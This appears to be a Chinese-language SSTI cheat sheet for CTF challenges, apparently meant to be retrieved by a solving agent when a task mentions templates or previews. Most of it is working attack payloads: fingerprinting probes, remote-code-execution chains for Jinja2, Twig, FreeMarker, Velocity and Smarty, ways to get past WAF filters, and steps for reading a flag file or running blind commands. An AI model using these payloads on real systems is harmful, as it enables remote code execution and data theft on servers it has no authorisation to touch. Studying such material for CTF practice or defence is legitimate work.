# 模板注入（SSTI）手册

适用题型（命中即召回本手册）：模板 渲染 预览 引擎 公告 通知 编辑 生成
自定义 配置 页面 样式 内容。

后台模板渲染/公告发布/自定义页面类功能是 SSTI 高发区。通用流程：
判引擎 → 拿对象链 → RCE → 读文件。

## 1. 判引擎（一次 script 批量发送）
- {{7*7}} → 49：Jinja2（Python）/ Twig（PHP）/ Nunjucks 类
- ${7*7} → 49：FreeMarker / Velocity（Java）
- <%= 7*7 %> / ${7*7}（JSP EL）：JSP/Thymeleaf
- {7*7} → 49：Smarty（PHP）
- {{7*7}} 原样回显：可能 Handlebars（逻辑少）或未渲染
再结合响应头/错误页指纹（Jinja2 报错带 TemplateSyntaxError 等）。

## 2. 各引擎通用 RCE 链（现场选链，勿背死链）
- Jinja2（Python）：
  `{{cycler.__init__.__globals__.os.popen('id').read()}}`
  或 `{{config.__class__.__init__.__globals__['os'].popen(...)}}`；
  被过滤 __ 时走 `{{''|attr('__class__')}}` 或 request.args 传参绕 WAF。
- Twig（PHP）：`{{_self.env.registerUndefinedFilterCallback('system')}}`
  配合参数执行。
- FreeMarker（Java）：`<#assign ex="freemarker.template.utility.Execute"?new()>
  ${ex("id")}`。
- Velocity（Java）：`#set($e="e")$e.getClass().forName(...)` 反射链。
- Smarty（PHP）：`{system('id')}` / `{$smarty.version}` 确认后 self 链。

## 3. 落地
- 先 id/ls 验证执行，再读 flag（本平台常规 /challenge/flag.txt）；
- 无回显用盲执行（sleep）或外带；沙箱拦截 os/popen 时换 subprocess/importlib
  等模块对象继续找（__subclasses__ 链）。
